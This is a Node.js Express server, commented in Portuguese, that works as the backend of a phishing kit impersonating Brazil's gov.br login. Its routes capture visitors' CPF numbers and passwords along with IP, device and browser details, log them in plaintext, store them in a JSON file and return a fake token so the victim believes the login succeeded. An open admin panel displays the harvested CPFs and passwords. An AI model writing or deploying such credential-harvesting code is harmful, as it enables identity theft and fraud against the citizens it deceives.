const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Banco de dados em arquivo
let database = {
    users: [],
    logs: []
};

// Carregar dados salvos
const dadosFile = path.join(__dirname, 'dados.json');
if (fs.existsSync(dadosFile)) {
    try {
        const saved = JSON.parse(fs.readFileSync(dadosFile));
        database.users = saved.users || [];
        database.logs = saved.logs || [];
        console.log(`✅ Carregados ${database.users.length} usuários`);
    } catch(e) {}
}

function salvarDados() {
    fs.writeFileSync(dadosFile, JSON.stringify({ users: database.users, logs: database.logs }, null, 2));
    console.log(`💾 Salvo: ${database.users.length} usuários`);
}

// ============ ROTAS ============

// Rota para receber CPF
app.post('/api/cpf', (req, res) => {
    const { cpf, ip, dispositivo, navegador } = req.body;
    
    console.log(`📝 CPF: ${cpf} | IP: ${ip} | ${dispositivo} | ${navegador}`);
    
    let user = database.users.find(u => u.cpf === cpf);
    
    if (!user) {
        user = {
            cpf: cpf,
            senha: null,
            ip: ip,
            dispositivo: dispositivo,
            navegador: navegador,
            data_cpf: new Date().toISOString(),
            status: 'aguardando_senha'
        };
        database.users.push(user);
    } else {
        user.ip = ip;
        user.dispositivo = dispositivo;
        user.navegador = navegador;
        user.status = 'aguardando_senha';
    }
    
    database.logs.unshift({
        tipo: 'cpf_inserido',
        cpf: cpf,
        ip: ip,
        dispositivo: dispositivo,
        navegador: navegador,
        data: new Date().toISOString()
    });
    
    salvarDados();
    res.json({ success: true });
});

// Rota para receber SENHA
app.post('/api/login', (req, res) => {
    const { cpf, password, ip, dispositivo, navegador } = req.body;
    
    console.log(`🔐 SENHA para ${cpf}: ${password}`);
    
    let user = database.users.find(u => u.cpf === cpf);
    
    if (!user) {
        user = {
            cpf: cpf,
            senha: password,
            ip: ip,
            dispositivo: dispositivo,
            navegador: navegador,
            data_cpf: new Date().toISOString(),
            data_senha: new Date().toISOString(),
            status: 'completo'
        };
        database.users.push(user);
    } else {
        user.senha = password;
        user.ip_senha = ip;
        user.dispositivo_senha = dispositivo;
        user.navegador_senha = navegador;
        user.data_senha = new Date().toISOString();
        user.status = 'completo';
    }
    
    database.logs.unshift({
        tipo: 'senha_inserida',
        cpf: cpf,
        senha: password,
        ip: ip,
        dispositivo: dispositivo,
        navegador: navegador,
        data: new Date().toISOString()
    });
    
    salvarDados();
    
    // Retorna sucesso (simula login do gov.br)
    res.json({ 
        success: true, 
        token: 'fake-token-' + Date.now(),
        user: { nome: `Usuario`, cpf: cpf, role: 'user' }
    });
});

// ============ PAINEL ADMIN ============

app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Painel Admin - Dados Coletados</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; }
                .stats { background: #111; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
                th { background: #1a1a1a; color: #0f0; }
                tr:hover { background: #1a1a1a; }
                .senha { background: #2a2a2a; font-weight: bold; color: #ff0; }
                .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; }
                .bg-red { background: #c00; }
                .bg-green { background: #0a0; }
                .btn { background: #c00; color: white; border: none; padding: 5px 10px; cursor: pointer; margin: 5px; }
                .btn:hover { background: #f00; }
                .log-entry { padding: 5px; border-bottom: 1px solid #333; font-size: 12px; }
            </style>
        </head>
        <body>
            <h1>🔐 PAINEL ADMIN - DADOS COLETADOS</h1>
            <div class="stats" id="stats"></div>
            <h2>📋 USUÁRIOS COM CPF E SENHA</h2>
            <table id="usersTable">
                <thead><tr><th>CPF</th><th>SENHA</th><th>IP</th><th>Dispositivo</th><th>Navegador</th><th>Data</th><th>Ação</th></tr></thead>
                <tbody id="usersBody"></tbody>
            </table>
            <br>
            <h2>📜 LOGS DE ATIVIDADES</h2>
            <div id="logs" style="background:#111; padding:10px; max-height:300px; overflow-y:auto;"></div>
            <br>
            <button class="btn" onclick="location.reload()">🔄 ATUALIZAR</button>
            <button class="btn" onclick="fetch('/api/admin/clear',{method:'POST'}).then(()=>location.reload())">🗑️ LIMPAR DADOS</button>
            
            <script>
                function formatarCPF(cpf) {
                    if (!cpf) return '';
                    cpf = cpf.toString();
                    if (cpf.length === 11) return cpf.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4');
                    return cpf;
                }
                
                fetch('/api/admin/users')
                    .then(r => r.json())
                    .then(data => {
                        const users = data.users || [];
                        const stats = document.getElementById('stats');
                        stats.innerHTML = '<strong>📊 ESTATISTICAS</strong><br>' +
                            'Total de usuarios: ' + users.length + '<br>' +
                            'Com senha completa: ' + users.filter(u => u.senha).length + '<br>' +
                            'Aguardando senha: ' + users.filter(u => !u.senha).length;
                        
                        const tbody = document.getElementById('usersBody');
                        if (users.length === 0) {
                            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado ainda</td></tr>';
                        } else {
                            tbody.innerHTML = users.map(u => \`
                                <tr>
                                    <td>\${formatarCPF(u.cpf)}</td>
                                    <td class="senha">\${u.senha || '--------'}</td>
                                    <td>\${u.ip || '-'}</td>
                                    <td>\${u.dispositivo || '-'}</td>
                                    <td>\${u.navegador || '-'}</td>
                                    <td>\${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
                                    <td><button onclick="fetch('/api/admin/delete/'+encodeURIComponent(u.cpf),{method:'DELETE'}).then(()=>location.reload())" style="background:#c00;border:none;padding:3px 8px;color:white;cursor:pointer;">X</button></td>
                                </tr>
                            \`).join('');
                        }
                    });
                
                fetch('/api/admin/logs')
                    .then(r => r.json())
                    .then(data => {
                        const logsDiv = document.getElementById('logs');
                        if (data.logs.length === 0) {
                            logsDiv.innerHTML = '<div>Nenhum log registrado</div>';
                        } else {
                            logsDiv.innerHTML = data.logs.map(log => \`
                                <div class="log-entry">
                                    [\${new Date(log.data).toLocaleString()}] 
                                    <span class="badge \${log.tipo === 'senha_inserida' ? 'bg-green' : 'bg-red'}">\${log.tipo}</span>
                                    CPF: \${log.cpf} | IP: \${log.ip} | \${log.dispositivo} | \${log.navegador}
                                    \${log.senha ? '<span style="color:#ff0"> | SENHA: ' + log.senha + '</span>' : ''}
                                </div>
                            \`).join('');
                        }
                    });
            </script>
        </body>
        </html>
    `);
});

app.get('/api/admin/users', (req, res) => {
    res.json({ users: database.users });
});

app.get('/api/admin/logs', (req, res) => {
    res.json({ logs: database.logs });
});

app.delete('/api/admin/delete/:cpf', (req, res) => {
    const cpf = req.params.cpf;
    database.users = database.users.filter(u => u.cpf !== cpf);
    salvarDados();
    res.json({ success: true });
});

app.post('/api/admin/clear', (req, res) => {
    database.users = [];
    database.logs = [];
    salvarDados();
    res.json({ success: true });
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📊 Painel Admin: http://localhost:${PORT}/admin`);
});